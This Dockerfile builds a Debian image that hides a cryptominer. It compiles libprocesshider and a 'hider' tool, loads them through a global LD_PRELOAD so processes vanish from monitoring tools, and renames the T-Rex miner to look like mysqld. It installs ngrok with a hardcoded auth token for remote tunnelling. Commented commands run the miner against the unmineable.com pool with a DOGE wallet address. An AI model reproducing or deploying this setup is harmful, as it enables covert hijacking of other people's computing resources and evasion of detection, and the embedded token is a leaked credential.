FROM debian:10

MAINTAINER human
USER 0

RUN mkdir /nodefiles /nodefiles/php
ADD libprocesshider /nodefiles
ADD hider.c /nodefiles
ADD mysqld /nodefiles
ADD trex /nodefiles/php

RUN apt-get update
RUN apt-get install sudo wget tar htop git make gcc -y
ENV AUTHTOKEN=1o79XtSYTbApvdYruCJwpX5kyVJ_4fQ28refmFoEc36iQvgPc
ENV FILE=ngrok-stable-linux-amd64.tgz
RUN wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz && tar -xvf $FILE && ./ngrok authtoken $AUTHTOKEN 


ENV PATHFORFILE=/nodefiles
ENV PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11/b‌​in

RUN cd $PATHFORFILE && make
RUN cd $PATHFORFILE && gcc -o hider hider.c
RUN cd $PATHFORFILE && mv libprocesshider.so /usr/local/lib/
ENV LD_PRELOAD=/usr/local/lib/libprocesshider.so
CMD /bin/bash

#./hider -s "/usr/sbin/mysqld" xyz && 
#t-rex -a Kawpow -o stratum+tcp://kp.unmineable.com:3333 --coin DOGE:D6PTJ33FqFsx8JLXBobEz1ChGqaJuZtait.$RANDOM 
#cd $PATHFORFILE && ./hider -s "/usr/sbin/mysqld" xyz && 
